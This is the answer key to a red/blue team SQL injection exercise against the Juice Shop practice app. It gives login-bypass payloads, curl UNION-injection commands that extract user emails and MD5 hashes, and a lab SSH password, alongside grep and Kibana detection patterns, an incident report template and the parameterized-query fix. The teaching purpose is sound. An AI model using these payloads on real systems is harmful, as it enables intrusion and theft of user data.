# Exercise 01 Answers: SQL Injection Attack & Defense

## 🔴 Red Team Answers

### Successful SQL Injection Payloads

#### Login Bypass
```
Email: ' OR '1'='1'--
Password: anything
```
**Result:** Logs in as admin

#### Alternative Login Payloads
```sql
# These also work:
admin@juice-sh.op'--
' OR 1=1--
' OR '1'='1
admin'--
```

#### Search SQL Injection
```bash
# Basic UNION injection
curl "http://<VPS_IP>:8080/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"

# Extract users table
curl "http://<VPS_IP>:8080/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
```

#### Extracted Data
| Email | Password Hash |
|-------|---------------|
| admin@juice-sh.op | 0192023a7bbd73250516f069df18b500 |
| jim@juice-sh.op | e541ca7ecf72b8d1286474fc613e5e45 |
| bender@juice-sh.op | 0c36e517e3fa95aabf1bbffc6744a4ef |

*(Hashes are MD5 - can be cracked with hashcat or online tools)*

---

## 🔵 Blue Team Answers

### SSH Access

```bash
# Connect to Blue Team server
ssh blueteam@<VPS_IP> -p 2222
# Password: defend123
```

### Detection Commands (on Blue Team Server)

#### Find SQL Injection Attempts
```bash
grep -iE "(union|select|or.1=1|'--|%27)" /var/log/nginx/access.log

# Or use helper script
~/scripts/detect-sqli.sh
```

#### Count Attacks Per IP
```bash
grep -iE "(union|select|or.1=1)" /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn

# Or use helper script
~/scripts/show-attackers.sh
```

#### Kibana Query
```
message: (*UNION* OR *SELECT* OR *OR*1=1* OR *'--*)
```

### Blocking - Document Attacker IP

```bash
# Find attacker IP
ATTACKER=$(grep -iE "union|select" /var/log/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

echo "Attacker IP to report: $ATTACKER"
echo "$ATTACKER" >> ~/blocked_ips.txt
```

### Sample Incident Report

```
INCIDENT SUMMARY
================
Date: 2024-01-15
Duration: 14:30 - 15:00

Attacker IP: 192.168.1.100
Attack Type: SQL Injection

Attacks Detected:
- Authentication bypass attempts: 12
- Data extraction attempts: 8
- Successful extractions: 3

Data Potentially Exposed:
- User emails: YES
- Password hashes: YES (MD5, crackable)

Response Actions:
- 14:35 - Attack detected via log monitoring
- 14:38 - IP blocked via iptables
- 14:40 - Attack stopped

Recommendations:
1. Use parameterized queries/prepared statements
2. Implement Web Application Firewall
3. Use bcrypt instead of MD5 for passwords
4. Limit database user permissions
```

---

## 🎓 Learning Points

### Why This Works
1. **No Input Validation:** The login accepts SQL in the email field
2. **String Concatenation:** Query is built with: `SELECT * FROM Users WHERE email='` + input + `'`
3. **Comment Injection:** `--` comments out the rest of the query

### Proper Fix (Code Level)
```javascript
// WRONG (vulnerable)
const query = `SELECT * FROM Users WHERE email='${email}'`;

// RIGHT (parameterized)
const query = 'SELECT * FROM Users WHERE email = ?';
db.query(query, [email]);
```

### Detection Indicators
- Multiple `'` or `"` in request parameters
- SQL keywords: UNION, SELECT, FROM, WHERE
- Comment indicators: `--`, `#`, `/*`
- Boolean tests: `OR 1=1`, `OR 'a'='a'`
